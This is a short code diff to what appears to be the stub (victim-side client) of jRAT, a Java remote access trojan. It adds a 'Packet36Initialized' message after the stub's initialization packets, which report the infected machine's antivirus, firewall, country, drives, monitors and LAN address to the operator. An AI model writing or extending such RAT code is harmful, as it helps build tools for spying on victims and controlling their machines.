@@ -33,6 +33,7 @@ import su.jrat.stub.packets.outgoing.Packet26InitJavaPath;
 import su.jrat.stub.packets.outgoing.Packet28InitLanAddress;
 import su.jrat.stub.packets.outgoing.Packet30InitVersion;
 import su.jrat.stub.packets.outgoing.Packet31InitInstallationDate;
+import su.jrat.stub.packets.outgoing.Packet36Initialized;
 import su.jrat.stub.packets.outgoing.Packet47InitCountry;
 import su.jrat.stub.packets.outgoing.Packet61InitMonitors;
 import su.jrat.stub.packets.outgoing.Packet62InitDrives;
@@ -174,6 +175,8 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet69InitAntivirus());
 
 		addToSendQueue(new Packet70InitFirewall());
+		
+		addToSendQueue(new Packet36Initialized());
 	}
 
 	public static void addToSendQueue(AbstractOutgoingPacket packet) {
